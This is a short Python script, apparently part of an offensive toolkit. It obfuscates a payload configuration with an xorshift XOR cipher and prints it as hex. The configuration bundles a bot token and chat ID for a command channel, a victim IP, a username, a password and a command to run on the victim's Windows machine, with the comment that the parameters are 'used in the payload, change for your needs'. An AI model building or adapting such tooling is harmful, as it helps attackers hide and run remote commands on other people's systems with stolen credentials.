def xorshift_encrypt(data: bytes, key: int) -> bytes:
    result = bytearray()
    state = key & 0xFFFFFFFF 

    for b in data:
        state ^= (state << 13) & 0xFFFFFFFF
        state ^= (state >> 17)
        state ^= (state << 5) & 0xFFFFFFFF
        prng_byte = (state & 0xFF)

        result.append(b ^ prng_byte)

    return bytes(result)

# all these parameters are used in the payload, change for your needs

KEY=0xDEADBEEF 
TOKEN = "BOT TOKEN"
CHAT_ID = "CHAT ID"
IP_ADDR = "VICTIM_IP"
USER = "USERNAME"
PASSWORD = "PASSWORD"
COMMAND = "echo 'YOU HAVE BEEN PWNED!' > C:\\Users\\Administrator\\hello.txt" 


msg = f"{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}".encode()

enc = xorshift_encrypt(msg, KEY)

print(enc.hex())
